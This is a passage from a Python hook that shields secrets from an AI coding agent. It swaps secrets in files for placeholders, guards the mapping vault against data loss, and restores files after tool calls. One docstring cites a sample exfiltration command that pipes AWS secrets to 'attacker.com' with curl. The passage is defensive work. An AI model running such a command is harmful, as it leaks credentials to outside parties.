                    try:
                        with open(original_path, "rb") as f:
                            current_hash = hashlib.sha256(f.read()).hexdigest()
                        with open(bak_path, "rb") as f:
                            bak_bytes = f.read()
                        bak_hash = hashlib.sha256(bak_bytes).hexdigest()
                        # If hashes match, file was never overwritten — restore
                        # (this handles the Read redact case: file is redacted,
                        #  crash, restore original)
                        # If hashes differ AND file doesn't contain redacted
                        # content, a Write completed — don't restore.
                        if current_hash != bak_hash:
                            # File changed since backup. Check if it still has
                            # placeholders (= redacted, tool didn't finish).
                            with open(original_path, "r", errors="replace") as f:
                                disk_content = f.read()
                            placeholder_re = re.compile(r'\{\{[A-Z0-9_]+_[a-f0-9]{8}x*\}\}')
                            if not placeholder_re.search(disk_content):
                                # No placeholders = Write completed with real data.
                                # Don't restore old backup.
                                debug_log(f"Crash recovery: skipping {original_path} (Write completed)")
                                for p in (meta_path, bak_path):
                                    if os.path.exists(p):
                                        os.remove(p)
                                continue
                        # Either hashes match (restore redacted -> original)
                        # or file has placeholders (tool failed mid-write, restore)
                        shutil.copy2(bak_path, original_path)
                    except (OSError, PermissionError):
                        shutil.copy2(bak_path, original_path)
                    # Restore original permissions and timestamps from metadata
                    if "mode" in meta:
                        os.chmod(original_path, meta["mode"])
                    if "atime" in meta and "mtime" in meta:
                        os.utime(original_path, (meta["atime"], meta["mtime"]))
                for p in (meta_path, bak_path):
                    if os.path.exists(p):
                        os.remove(p)
            except (json.JSONDecodeError, OSError, KeyError):
                try:
                    os.remove(meta_path)
                except OSError:
                    pass


    # Restore pending backups on startup (crash recovery).
    # Only for PreToolUse — PostToolUse means the tool completed normally,
    # so backups from this cycle should be handled by the PostToolUse handler.
    if not is_post_hook:
        restore_pending_backups()


    # ── Mapping management ───────────────────────────────────────────────────
    # Sentinel key marking a mapping that could NOT be read off disk. It is not
    # the same thing as an empty mapping, and conflating the two destroys data:
    #
    #   `save_mapping` opens with O_TRUNC. So "load failed -> empty mapping" plus
    #   "redact one secret" plus "save" replaces the whole vault with the one or
    #   two entries this invocation happened to create. Reproduced: a 50-entry
    #   encrypted mapping went to 2 plaintext entries from a single Read event,
    #   the only precondition being an interpreter without `cryptography` (FERNET
    #   is None, the encrypted bytes fail json.loads, the outer handler returns
    #   empty). Every placeholder already baked into a file becomes permanently
    #   unresolvable, and the surviving entries land in plaintext.
    #
    # So an unreadable vault must (a) never be saved over, and (b) stop redaction
    # for this invocation. (b) is not optional: redacting while unable to persist
    # writes placeholders that nothing can ever restore, which is worse than not
    # redacting at all. Passing content through unchanged loses the shield for
    # one invocation; the alternative corrupts files permanently.
    VAULT_UNREADABLE = "_vault_unreadable"

    def _unreadable_vault(reason):
        record_shield_failure(
            "vault-unreadable",
            reason=scrub_secrets(reason),
            path=MAPPING_FILE,
            action="mapping left untouched; redaction disabled for this invocation",
        )
        return {"secret_to_placeholder": {}, "placeholder_to_secret": {},
                VAULT_UNREADABLE: reason}

    def vault_is_unreadable(mapping):
        return bool(mapping) and bool(mapping.get(VAULT_UNREADABLE))

    # A mapping file that exists and is zero bytes is NOT a clean first run.
    # `save_mapping` used to open the real path with O_TRUNC, so a writer killed
    # between the open and the write left exactly this: the file present, the
    # vault gone. Reading that as "nothing here yet" restarts the vault from
    # empty and orphans every placeholder already written into a file — the same
    # loss as the incident above, reached by a crash instead of by a crypto-less
    # interpreter. The atomic commit below means this code can no longer CREATE
    # such a file, but one may already be on disk, and other writers exist
    # (an interrupted editor, a `touch`, a restore from a truncated backup).
    ZERO_BYTE_REASON = (
        "mapping file exists but is zero bytes — a writer was interrupted, or "
        "something else truncated it. An empty file is not an empty vault. If "
        "this vault genuinely never held anything, move the file aside and the "
        "next run will create a new one"
    )

    def _read_mapping_file():
        """Read and decode whatever is on disk.

        Returns (data, None) when the mapping was read, ({}, None) when there is
        genuinely nothing there, and (None, reason) when a file exists but could
        not be interpreted. Records nothing — callers decide what a failure
        means, which is what lets `save_mapping` re-read under its own lock
        without emitting a second alarm for the same file.
        """
        path = MAPPING_FILE
        try:
            if not os.path.exists(path):
                # Genuinely nothing here yet. The skeleton matters: callers
                # index the two tables directly.
                return {"secret_to_placeholder": {}, "placeholder_to_secret": {}}, None
            # Permission enforcement: fix group/other access
            st = os.stat(path)
            if st.st_mode & 0o077:
                os.chmod(path, 0o600)
            with open(path, 'rb') as f:
                fcntl.flock(f.fileno(), fcntl.LOCK_SH)
                raw = f.read()
                fcntl.flock(f.fileno(), fcntl.LOCK_UN)
        except (OSError, PermissionError) as e:
            return None, f"{type(e).__name__} while reading mapping"

        if not raw:
            return None, ZERO_BYTE_REASON

        data = None
        if FERNET:
            try:
                data = json.loads(FERNET.decrypt(raw))
            except Exception:
                # Fallback: try reading as plaintext (migration from unencrypted)
                try:
                    data = json.loads(raw)
                    debug_log("Loaded plaintext mapping, will re-save encrypted")
                except (json.JSONDecodeError, UnicodeDecodeError):
                    return None, ("mapping decrypts with neither the derived key nor "
                                  "as plaintext JSON")
        else:
            # No Fernet in this interpreter. Plaintext mode is only legitimate
            # when what is on disk is ALSO plaintext; an encrypted vault read by
            # a crypto-less interpreter is unreadable, not empty.
            try:
                data = json.loads(raw)
            except (json.JSONDecodeError, UnicodeDecodeError):
                return None, ("mapping is encrypted but `cryptography` is unavailable "
                              "to this interpreter, so it cannot be read")

        # Valid JSON that is not an object decodes fine and then fails on the
        # first .pop(), which the outer fail-open would swallow. It is still a
        # vault nobody can read.
        if not isinstance(data, dict):
            return None, f"mapping decoded to {type(data).__name__}, not an object"

        data.pop("counters", None)
        data.setdefault("secret_to_placeholder", {})
        data.setdefault("placeholder_to_secret", {})
        if not isinstance(data["secret_to_placeholder"], dict) or \
                not isinstance(data["placeholder_to_secret"], dict):
            return None, "mapping object does not hold the two expected tables"
        return data, None


    def load_mapping():
        """Load the global mapping file (encrypted if Fernet available).

        Returns an empty mapping when there is genuinely nothing on disk, and a
        mapping carrying VAULT_UNREADABLE when a file exists but could not be
        interpreted — see the note above for why the distinction matters.
        """
        data, reason = _read_mapping_file()
        if reason is not None:
            return _unreadable_vault(reason)
        return data


    def _mapping_lock():
        """Exclusive lock covering read-merge-write on the mapping.

        A sidecar file, not the mapping itself: the write commits with
        os.replace(), so the mapping's inode changes underneath. A writer
        holding a lock on the old inode and the next writer opening the new one
        would both believe they held it.
        """
        fd = os.open(MAPPING_LOCK_FILE, os.O_RDWR | os.O_CREAT, 0o600)
        try:
            fcntl.flock(fd, fcntl.LOCK_EX)
        except OSError:
            os.close(fd)
            raise
        return fd


    def save_mapping(mapping):
        """Persist the global mapping: merge with disk under lock, then commit
        atomically. Encrypted, 0600, with LRU eviction.

        Two separate hazards, and the mapping is append-only in practice, which
        is what makes one answer serve both:

        1. Overwriting a vault nobody could read (the incident above).
        2. Overwriting a vault someone else just wrote. Hook processes run
           concurrently — one per tool call, and tool calls are issued in
           parallel. A gets the mapping, B gets the same mapping, both mint a
           placeholder, both save; whoever writes second wins and the other's
           entry is gone, while the file it redacted keeps the placeholder. Not
           a new bug — it predates the unreadable-vault work — but it is the
           same ending: a placeholder on disk that nothing can resolve.

        So this re-reads the mapping under an exclusive lock and merges into it
        rather than trusting the copy the caller loaded. Merging is sound here
        because placeholder names are deterministic HMACs of the secret: two
        processes that mint an entry for the same secret produce the same
        entry, and entries are only ever added. The alternative — holding one
        lock across the caller's whole load/mutate/save — would put arbitrary
        file I/O inside the critical section, and one hook dying in there wedges
        every other hook on the machine.
        """
        # Refuse to write over a vault we could not read.
        if vault_is_unreadable(mapping):
            record_shield_failure(
                "vault-save-refused",
                reason=scrub_secrets(mapping.get(VAULT_UNREADABLE)),
                path=MAPPING_FILE,
                action="refused to overwrite an unreadable mapping",
            )
            return

        lock_fd = None
        tmp_path = None
        try:
            dir_name = os.path.dirname(MAPPING_FILE) or "."
            os.makedirs(dir_name, exist_ok=True)
            lock_fd = _mapping_lock()

            # Re-read INSIDE the lock. The caller's copy may be minutes old.
            disk, reason = _read_mapping_file()
            if reason is not None:
                # It was readable when the caller loaded it and is not now, or
                # the caller never read it at all. Either way, writing here
                # would destroy whatever is actually there.
                record_shield_failure(
                    "vault-save-refused",
                    reason=scrub_secrets(reason),
                    path=MAPPING_FILE,
                    action="refused to overwrite a mapping that became unreadable",
                )
                return

            reserved = ("secret_to_placeholder", "placeholder_to_secret",
                        "counters", VAULT_UNREADABLE)
            merged_s2p = dict(disk.get("secret_to_placeholder", {}))
            merged_p2s = dict(disk.get("placeholder_to_secret", {}))

            # Disk wins on conflict. A placeholder already bound on disk may
            # already be written into files this process never saw; rebinding
            # it would make those restore to the wrong secret.
            collisions = []
            for ph, sec in mapping.get("placeholder_to_secret", {}).items():
                if ph not in merged_p2s:
                    merged_p2s[ph] = sec
                elif merged_p2s[ph] != sec:
                    collisions.append(ph)
            for sec, ph in mapping.get("secret_to_placeholder", {}).items():
                merged_s2p.setdefault(sec, ph)
            if collisions:
                # Needs an 8-hex HMAC collision AND concurrency, so this should
                # never fire. If it ever does, a file this process just redacted
                # holds a placeholder that resolves to a different secret, and
                # only a human can sort that out. Names are safe to log; values
                # are not, and none are logged.
                record_shield_failure(
                    "placeholder_collision",
                    path=MAPPING_FILE,
                    placeholders=sorted(collisions)[:20],
                    action="kept the binding already on disk",
                )

            merged = {k: v for k, v in disk.items() if k not in reserved}
            for k, v in mapping.items():
                if k not in reserved:
                    merged[k] = v
            merged["secret_to_placeholder"] = merged_s2p
            merged["placeholder_to_secret"] = merged_p2s

            # Evict oldest entries if over limit
            if len(merged_s2p) > MAX_MAPPING_ENTRIES:
                entries = list(merged_s2p.items())
                keep = entries[len(entries) // 2:]
                merged["secret_to_placeholder"] = dict(keep)
                merged["placeholder_to_secret"] = {
                    v: k for k, v in merged["secret_to_placeholder"].items()}
                debug_log(f"Evicted {len(entries) - len(keep)} old mapping entries")

            json_bytes = json.dumps(merged).encode('utf-8')

            # Encrypt if Fernet available
            if FERNET:
                payload = FERNET.encrypt(json_bytes)
            else:
                payload = json_bytes

            # Temp file, fsync, atomic rename. The old code opened the real path
            # with O_TRUNC and wrote in place, so any death between the two —
            # a kill, a full disk, a crash — left a zero-byte or half-written
            # vault where a complete one had been. A rename is all-or-nothing:
            # a reader sees the previous mapping or the new one, never neither.
            fd, tmp_path = tempfile.mkstemp(
                dir=dir_name, prefix=".redact-mapping.", suffix=".tmp")
            with os.fdopen(fd, "wb") as f:
                os.fchmod(f.fileno(), 0o600)  # mkstemp is 0600; be explicit
                f.write(payload)
                f.flush()
                os.fsync(f.fileno())
            os.replace(tmp_path, MAPPING_FILE)
            tmp_path = None
            try:
                dir_fd = os.open(dir_name, os.O_RDONLY)
                try:
                    os.fsync(dir_fd)  # so the rename itself survives power loss
                finally:
                    os.close(dir_fd)
            except OSError:
                pass

            # Hand the merged view back to the caller: it may go on to restore
            # content, and entries another process minted are entries it can
            # now resolve.
            mapping["secret_to_placeholder"] = merged["secret_to_placeholder"]
            mapping["placeholder_to_secret"] = merged["placeholder_to_secret"]
            mapping.pop("counters", None)
            debug_log(f"Mapping saved ({'encrypted' if FERNET else 'plaintext'}): {len(merged.get('secret_to_placeholder', {}))} secrets")
        except OSError as e:
            # Silence is how the original incident ran undetected. A save that
            # did not happen means placeholders minted in this invocation are
            # unresolvable, which is worth a line in the log.
            record_shield_failure(
                "vault-save-failed",
                reason=scrub_secrets(f"{type(e).__name__}: {e}"),
                path=MAPPING_FILE,
                action="mapping left as it was; placeholders minted in this "
                       "invocation may be unresolvable",
            )
        finally:
            if tmp_path:
                try:
                    os.remove(tmp_path)
                except OSError:
                    pass
            if lock_fd is not None:
                try:
                    fcntl.flock(lock_fd, fcntl.LOCK_UN)
                finally:
                    os.close(lock_fd)


    def get_placeholder(mapping, secret_value, pattern_name):
        """Get or create a deterministic HMAC-based placeholder for a secret value."""
        if secret_value in mapping["secret_to_placeholder"]:
            return mapping["secret_to_placeholder"][secret_value]

        digest = hmac.new(HMAC_KEY, secret_value.encode('utf-8', errors='replace'), hashlib.sha256).hexdigest()[:8]
        placeholder = "{{" + f"{pattern_name}_{digest}" + "}}"

        # Handle unlikely hash collision
        while placeholder in mapping["placeholder_to_secret"] and mapping["placeholder_to_secret"][placeholder] != secret_value:
            digest = digest + "x"
            placeholder = "{{" + f"{pattern_name}_{digest}" + "}}"

        mapping["secret_to_placeholder"][secret_value] = placeholder
        mapping["placeholder_to_secret"][placeholder] = secret_value
        return placeholder


    # ── Redact / Restore ─────────────────────────────────────────────────────
    def redact_content(content, mapping):
        """Scan content for secrets and replace with placeholders.

        Returns (redacted_content, found_any_secrets).
        The mapping is mutated in place and must be saved by the caller.
        """
        # The caller cannot save, so any placeholder minted here would be
        # written to disk with nothing able to restore it. Pass through.
        if vault_is_unreadable(mapping):
            return content, False

        # Collect all matches with their positions first
        matches = []
        for pattern_name, compiled in COMPILED_PATTERNS:
            for m in compiled.finditer(content):
                matched_value = m.group(0)
                if len(matched_value) < 8:
                    continue
                placeholder = get_placeholder(mapping, matched_value, pattern_name)
                matches.append((m.start(), m.end(), matched_value, placeholder, pattern_name))

        if not matches:
            return content, False

        # Auto-suppress HEX_CREDENTIAL_BARE if too many matches in one file.
        # This indicates a Web3 project with many tx hashes / bytes32 values.
        BARE_HEX_THRESHOLD = 3
        bare_count = sum(1 for *_, name in matches if name == "HEX_CREDENTIAL_BARE")
        if bare_count > BARE_HEX_THRESHOLD:
            debug_log(
                f"HEX_CREDENTIAL_BARE: {bare_count} matches exceed threshold ({BARE_HEX_THRESHOLD}), "
                f"suppressing bare hex matches for this file. "
                f"Add files to .claude-redact-ignore to skip scanning entirely."
            )
            matches = [m for m in matches if m[4] != "HEX_CREDENTIAL_BARE"]
            if not matches:
                return content, False

        debug_log(f"Found {len(matches)} secret match(es)")

        # Sort: longest match first, then by start position descending.
        # This ensures more specific (longer) patterns win over shorter catch-all patterns
        # when their ranges overlap.
        matches.sort(key=lambda x: (-(x[1] - x[0]), -x[0]))

        # Deduplicate: keep longest matches, skip any shorter overlapping match.
        kept = []
        used_ranges = []
        for start, end, secret, placeholder, _name in matches:
            if any(start < ue and end > us for us, ue in used_ranges):
                continue  # Skip overlapping
            kept.append((start, end, secret, placeholder))
            used_ranges.append((start, end))

        # Replace from end to start (by position) to avoid position shifting
        kept.sort(key=lambda x: x[0], reverse=True)
        result = content
        for start, end, secret, placeholder in kept:
            result = result[:start] + placeholder + result[end:]

        return result, True


    def restore_content(content, mapping):
        """Replace placeholders back to real secret values."""
        restored = content
        for placeholder, secret in mapping.get("placeholder_to_secret", {}).items():
            restored = restored.replace(placeholder, secret)
        return restored


    def backup_and_redact_file(file_path, mapping):
        """Backup original file and overwrite with redacted content.

        Used by Read, Write, and Edit PreToolUse handlers so Claude Code's
        freshness check sees the same content it recorded during Read.

        Returns True if the file was redacted, False otherwise.
        """
        # Skip binary files
        if is_binary_file(file_path):
            debug_log(f"Skipping binary file: {file_path}")
            return False

        # Skip files matching allowlist
        if is_ignored(file_path):
            return False

        try:
            with open(file_path, "rb") as f:
                raw_bytes = f.read()
            raw_content = raw_bytes.decode("utf-8", errors="replace")
        except (OSError, PermissionError):
            return False

        redacted, found = redact_content(raw_content, mapping)
        if not found:
            return False

        save_mapping(mapping)
        os.makedirs(BACKUP_DIR, mode=0o700, exist_ok=True)
        bp = backup_path_for(file_path)

        try:
            fd = os.open(bp + ".bak", os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
            with os.fdopen(fd, "wb") as f:
                f.write(raw_bytes)
            file_stat = os.stat(file_path)
            saved_mode = file_stat.st_mode

            with open(bp + ".meta", "w") as f:
                json.dump({
                    "original_path": file_path,
                    "mode": saved_mode,
                    "atime": file_stat.st_atime,
                    "mtime": file_stat.st_mtime,
                }, f)

            # Atomic write: write to temp file first, then rename (POSIX atomic)
            dir_name = os.path.dirname(file_path)
            with tempfile.NamedTemporaryFile(dir=dir_name, delete=False, mode='w', suffix='.tmp') as tmp:
                tmp.write(redacted)
                tmp.flush()
                os.fsync(tmp.fileno())
            os.rename(tmp.name, file_path)
            os.chmod(file_path, saved_mode)
            os.utime(file_path, (file_stat.st_atime, file_stat.st_mtime))

            debug_log(f"File redacted: {file_path}")
            return True
        except (OSError, PermissionError):
            # Clean up temp file if rename failed
            try:
                if 'tmp' in dir() and hasattr(tmp, 'name') and os.path.exists(tmp.name):
                    os.remove(tmp.name)
            except OSError:
                pass
            for suffix in (".bak", ".meta"):
                try:
                    os.remove(bp + suffix)
                except OSError:
                    pass
            return False


    def cleanup_backup(file_path):
        """Delete backup files without restoring."""
        bp = backup_path_for(file_path)
        for suffix in (".bak", ".meta"):
            try:
                os.remove(bp + suffix)
            except OSError:
                pass
        debug_log(f"Backup cleaned up: {file_path}")


    def restore_placeholders_in_file(file_path, mapping=None):
        """Replace every live placeholder in `file_path` with its real value.

        The backup-free counterpart to the `.bak` restore, for Write and Edit:
        there the placeholder came from the tool call, and restoring it is the
        contract the user was given ("use placeholders as-is — they are
        restored on write"). A backup is an optimisation, and the paths where
        it is missing (a Write creating a file, an Edit on a previously clean
        file) used to end with the placeholder sitting on disk.

        NOT for Read — see restore_read_from_foreign_backup for why.

        `mapping` is loaded lazily, only once the file is known to contain
        something placeholder-shaped, so an ordinary file costs one read and
        one regex.

        Returns the mapping when a restore was attempted, None when there was
        nothing to do. The caller needs it to verify the outcome.
        """
        if not file_path or not os.path.isfile(file_path):
            return None
        try:
            if is_binary_file(file_path):
                return None
            with open(file_path, "r", errors="replace") as f:
                current = f.read()
        except (OSError, PermissionError):
            return None
        if not PLACEHOLDER_RE.search(current):
            return None

        if mapping is None:
            mapping = load_mapping()
        if not mapping.get("placeholder_to_secret"):
            return mapping

        restored = restore_content(current, mapping)
        if restored == current:
            return mapping
        try:
            with open(file_path, "w") as f:
                f.write(restored)
            debug_log(f"Restored placeholders without a backup: {file_path}")
        except (OSError, PermissionError):
            debug_log(f"Could not write restored content: {file_path}")
        return mapping


    def find_foreign_backup(file_path):
        """Locate a backup for `file_path` filed under a DIFFERENT session id.

        `BACKUP_DIR` is keyed by session_id, but PreToolUse and PostToolUse do
        not always carry the same one — a subagent boundary is enough. When
        they differ the backup is real, just in the sibling directory, and
        Read's restore (the only thing that ever puts a redacted file back)
        silently does nothing.

        The filename is a hash of the path and carries no session component,
        so the sibling is findable by name. Returns (bak_path, meta) or
        (None, None).
        """
        path_hash = hashlib.sha256(file_path.encode()).hexdigest()[:16]
        parent = tempfile.gettempdir()
        try:
            entries = sorted(os.listdir(parent))
        except OSError:
            return None, None
        for name in entries:
            if not name.startswith(".claude-backup-"):
                continue
            d = os.path.join(parent, name)
            if os.path.abspath(d) == os.path.abspath(BACKUP_DIR):
                continue
            bak = os.path.join(d, path_hash + ".bak")
            if not os.path.isfile(bak):
                continue
            meta = {}
            try:
                with open(os.path.join(d, path_hash + ".meta")) as f:
                    meta = json.load(f)
            except (OSError, json.JSONDecodeError):
                pass
            if meta.get("original_path") and meta["original_path"] != file_path:
                continue  # hash collision, not our file
            return bak, meta
        return None, None


    def restore_read_from_foreign_backup(file_path):
        """Put back a redacted file whose backup landed in another session's
        directory. Returns "restored", "mismatch", "vault_unreadable", or None.

        Deliberately NOT a mapping-based restore. Expanding every placeholder
        found in a file the user merely READ would rewrite files this hook
        never redacted — and a live placeholder does occur at rest in prose
        and in test fixtures. Turning one of those into its real secret, in a
        file nobody asked to modify, is the same accident as baking a
        placeholder into a README, pointed the other way and with worse
        consequences.

        So this restores bytes, and only on proof: the backup must redact,
        under the current mapping, to exactly what is on disk right now. A
        stale backup from an abandoned session cannot reproduce the current
        file, so it is rejected rather than used to silently revert somebody's
        edits.
        """
        # Cheap check first: a file with no placeholder in it was not
        # redacted, and this runs after every Read that has no backup — i.e.
        # after almost every Read there is. No directory scan for those.
        try:
            with open(file_path, "rb") as f:
                current_bytes = f.read()
        except (OSError, PermissionError):
            return None
        current = current_bytes.decode("utf-8", errors="replace")
        if not PLACEHOLDER_RE.search(current):
            return None

        bak, meta = find_foreign_backup(file_path)
        if not bak:
            return None
        try:
            with open(bak, "rb") as f:
                original_bytes = f.read()
        except (OSError, PermissionError):
            return None
        if current_bytes == original_bytes:
            return None  # nothing was redacted

        mapping = load_mapping()
        if vault_is_unreadable(mapping):
            # The proof below re-redacts the backup and compares. With the vault
            # unreadable, redact_content is a pass-through, so the comparison
            # always fails and reports "mismatch" — the right refusal (an
            # unverified backup must not be copied over somebody's file) for
            # entirely the wrong reason. The backup may be perfect; what is
            # broken is the mapping, and that is the thing worth telling
            # someone, because it is also the thing they can fix.
            debug_log(f"Vault unreadable, cannot verify foreign backup: {file_path}")
            return "vault_unreadable"
        redacted, _found = redact_content(
            original_bytes.decode("utf-8", errors="replace"), mapping
        )
        if redacted != current:
            debug_log(f"Foreign backup does not match current content: {file_path}")
            return "mismatch"

        try:
            shutil.copy2(bak, file_path)
            if "mode" in meta:
                os.chmod(file_path, meta["mode"])
            if "atime" in meta and "mtime" in meta:
                os.utime(file_path, (meta["atime"], meta["mtime"]))
        except (OSError, PermissionError):
            return "mismatch"
        for p in (bak, bak[:-4] + ".meta"):
            try:
                os.remove(p)
            except OSError:
                pass
        debug_log(f"Restored from a foreign session's backup: {file_path}")
        return "restored"


    def verify_no_live_placeholders(file_path, mapping, context):
        """Did the restore pass that just ran actually achieve anything?

        Call this only where a mapping-based restore was ATTEMPTED. A
        placeholder that is still on disk AND still resolvable is a defect by
        definition — it is what every one of these bugs looks like from the
        outside, whatever the cause. That makes this a detector for the whole
        class rather than for the individual causes known today.

        Placeholders with no mapping entry are prose, not failures: this
        project's own README documents `{{OPENAI_KEY_8f3a2b1c}}`. Reporting
        those would make the alarm not worth reading, which is the same as
        having no alarm.
        """
        try:
            with open(file_path, "r", errors="replace") as f:
                text = f.read()
        except (OSError, PermissionError):
            return
        known = mapping.get("placeholder_to_secret", {}) if mapping else {}
        live = sorted({p for p in PLACEHOLDER_RE.findall(text) if p in known})
        if not live:
            return
        record_shield_failure(
            "residual_placeholder",
            path=file_path,
            context=context,
            count=len(live),
            placeholders=live[:20],
        )
        queue_post_warning(
            f"[claude-secret-shield] {file_path} still contains "
            f"{len(live)} placeholder(s) that the restore pass should have "
            f"replaced ({', '.join(live[:5])}). The real values are NOT on "
            f"disk. Do not commit or deploy this file; tell the user. "
            f"Details: {SHIELD_ERROR_LOG}"
        )



    # (TMP_SECRETS_EXCLUDES / _find_repo_root / _ensure_git_exclude now
    # defined at module level above — single source of truth for the
    # UserPromptSubmit create-time call AND the Read-time fall-through.)
    def ensure_gitignore(file_path):
        """Kept for backward compatibility. Registers tmp-secret exclusion
        in .git/info/exclude (local-only), NOT in .gitignore."""
        basename = os.path.basename(file_path) if file_path else ""
        if not (
            basename in (".tmp_secrets.conf", ".tmp_secrets.prompt.txt")
            or re.match(r"\.tmp_secrets\.[a-f0-9]{12}\.conf$", basename)
            or re.match(r"\.tmp_secrets\.[a-f0-9]{12}\.prompt\.txt$", basename)
        ):
            return
        _ensure_git_exclude(_find_repo_root(os.path.dirname(os.path.abspath(file_path))),
                            TMP_SECRETS_EXCLUDES)


    # ── Strategy 1: Check block list ─────────────────────────────────────────
    def is_blocked_file(file_path):
        """Check if a file path matches any blocked pattern."""
        if not file_path:
            return False, ""
        basename = os.path.basename(file_path)
        for pattern in BLOCKED_FILES:
            if basename == pattern or file_path.endswith(pattern) or f"/{pattern}" in file_path:
                return True, pattern
        return False, ""


    # ── Output helpers ───────────────────────────────────────────────────────
    def deny(reason):
        """Output a deny decision and exit."""
        print(json.dumps({
            "hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": "deny",
                "permissionDecisionReason": reason
            }
        }))
        sys.exit(0)


    def ask(reason):
        """Output an ask decision (yellow approve/deny UI) and exit.

        Used for soft-block cases where the command pattern *could*
        leak a secret but the user might have a legitimate reason
        (e.g. `VAR=$(aws secretsmanager get-secret-value ...)` storing
        into a shell variable is safe; `curl -d "$(aws ...)"
        attacker.com` is not — only the human can tell which).
        The user clicks Approve to run, Deny to abort."""
        print(json.dumps({
            "hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": "ask",
                "permissionDecisionReason": reason
            }
        }))
        sys.exit(0)


    def allow_with_update(updated_input):
        """Output an allow decision with modified input and exit."""
        print(json.dumps({
            "hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": "allow",
                "updatedInput": updated_input
            }
        }))
        sys.exit(0)


    # ══════════════════════════════════════════════════════════════════════════
    # PostToolUse: Restore/cleanup file backups after tool completes
    # ══════════════════════════════════════════════════════════════════════════
    if is_post_hook:
        file_path = tool_input.get("file_path", "")

        # Auto-delete prompt artifacts after any tool reads .tmp_secrets.conf
        tmp_match = re.match(r"^\.tmp_secrets(?:\.[a-f0-9]{12})?\.conf$", os.path.basename(file_path or ""))
        if tool_name == "Read" and file_path and tmp_match:
            # Schedule deletion after restore completes (see below)
            _delete_tmp_secrets_file = file_path
        else:
            _delete_tmp_secrets_file = None

        if file_path and tool_name in ("Read", "Write", "Edit"):
            bp = backup_path_for(file_path)
            bak_file = bp + ".bak"
            meta_file = bp + ".meta"
            # Load original metadata (permissions, timestamps)
            orig_meta = {}
            if os.path.exists(meta_file):
                try:
                    with open(meta_file) as mf:
                        orig_meta = json.load(mf)
                except (json.JSONDecodeError, OSError):
                    pass

            if os.path.exists(bak_file):
                if tool_name == "Read":
                    # Restore original content after Read
                    debug_log(f"Restoring file after Read: {file_path}")
                    try:
                        shutil.copy2(bak_file, file_path)
                        # Restore original permissions and timestamps
                        if "mode" in orig_meta:
                            os.chmod(file_path, orig_meta["mode"])
                        if "atime" in orig_meta and "mtime" in orig_meta:
                            os.utime(file_path, (orig_meta["atime"], orig_meta["mtime"]))
                    except OSError:
                        pass
                elif tool_name == "Edit":
                    # After Edit: file has edited content with placeholders.
                    # Replace all placeholders with real values.
                    mapping = load_mapping()
                    if mapping.get("placeholder_to_secret"):
                        try:
                            with open(file_path, "r", errors="replace") as f:
                                edited = f.read()
                            restored = restore_content(edited, mapping)
                            if restored != edited:
                                with open(file_path, "w") as f:
                                    f.write(restored)
                        except OSError:
                            # Fall back to restoring from backup
                            try:
                                shutil.copy2(bak_file, file_path)
                            except OSError:
                                pass
                        verify_no_live_placeholders(file_path, mapping, "Edit")
                elif tool_name == "Write":
                    # Scan for residual placeholders in the written file.
                    # Do NOT fall back to backup restore on error — the backup
                    # is the OLD file, not the new write.
                    # NOTE: crash recovery now uses content comparison to detect
                    # completed writes, so no write_freshness_only flag needed.
                    mapping = load_mapping()
                    if mapping.get("placeholder_to_secret"):
                        try:
                            with open(file_path, "r", errors="replace") as f:
                                written = f.read()
                            restored = restore_content(written, mapping)
                            if restored != written:
                                with open(file_path, "w") as f:
                                    f.write(restored)
                                debug_log(f"Write PostToolUse: restored placeholders in {file_path}")
                        except OSError:
                            debug_log(f"Write PostToolUse: could not scan {file_path}")
                        verify_no_live_placeholders(file_path, mapping, "Write")
                cleanup_backup(file_path)
            else:
                # No backup for this file. Three ordinary ways that happens,
                # and all three ended with a placeholder on disk, because
                # every restore above is gated on the backup existing:
                #
                #   Read  — PreToolUse ran under a different session id; a
                #           subagent boundary is enough. BACKUP_DIR is
                #           /tmp/.claude-backup-{session_id}, so the backup
                #           is real but in another directory, and the file
                #           stays REDACTED, permanently. This is the only one
                #           of the three that damages a file nobody asked to
                #           change.
                #   Write — the file did not exist before, so there was no
                #           pre-image to back up.
                #   Edit  — the pre-edit file held no secret, so Edit's
                #           PreToolUse made no backup. An edit that
                #           *introduces* a placeholder into a clean file is
                #           precisely the case that needs restoring.
                #
                # For Write and Edit the PreToolUse rewrite of
                # content/new_string normally keeps placeholders off disk, so
                # this is a second line of defence — but it is a reachable
                # one: the dispatcher returns the first decision produced, so
                # a deploy_config_guard `ask` on docker-compose.yml discards
                # the shield's `updatedInput`, and approving it writes the
                # original, placeholder-bearing input. A placeholder in a
                # README is a broken doc; in docker-compose.yml it is a
                # broken deploy.
                #
                # Read and Write/Edit get different repairs on purpose. Read
                # restores BYTES from the sibling session's backup, because a
                # Read must not change a file it was only supposed to look
                # at; expanding placeholders by mapping would rewrite prose
                # and test fixtures that legitimately quote one. Write/Edit
                # restore by MAPPING, because there the placeholder came from
                # the tool call itself and "use placeholders as-is, they are
                # restored on write" is the contract the user was given.
                if tool_name == "Read":
                    outcome = restore_read_from_foreign_backup(file_path)
                    if outcome in ("mismatch", "vault_unreadable"):
                        # Same outcome, two different causes, and reporting the
                        # wrong one sends whoever reads this looking for a stale
                        # backup when the actual fault is a mapping they cannot
                        # read — which is repairable, and which is also
                        # disabling the shield everywhere else right now.
                        cause = (
                            "the secret mapping could not be read, so the backup "
                            "could not be verified against the file"
                            if outcome == "vault_unreadable"
                            else "the backup no longer matches the file"
                        )
                        record_shield_failure(
                            "unrestorable_read",
                            path=file_path,
                            context=f"Read ({cause})",
                            cause=outcome,
                        )
                        queue_post_warning(
                            f"[claude-secret-shield] {file_path} was redacted "
                            f"for a Read and could not be restored: {cause}. "
                            f"It may still hold "
                            f"`{{{{NAME_hash}}}}` placeholders where real values "
                            f"belong. Check it before committing. "
                            f"Details: {SHIELD_ERROR_LOG}"
                        )
                else:
                    mapping = restore_placeholders_in_file(file_path)
                    if mapping is not None:
                        verify_no_live_placeholders(
                            file_path, mapping, f"{tool_name} (no backup)"
                        )

        # ── Bash PostToolUse: fix files that may have been written with ──────
        # ── redacted placeholders by a Bash read-modify-write script.      ──
        #
        # Bug scenario: a Bash command (e.g. python3 script) reads a file
        # while it is temporarily redacted on disk, then writes the content
        # back — baking the {{PLACEHOLDER}} into the real file.
        #
        # Strategy: extract file paths mentioned in the command, then scan
        # each writable file for placeholder patterns and restore them.
        # Also scan any files with pending backup metadata.
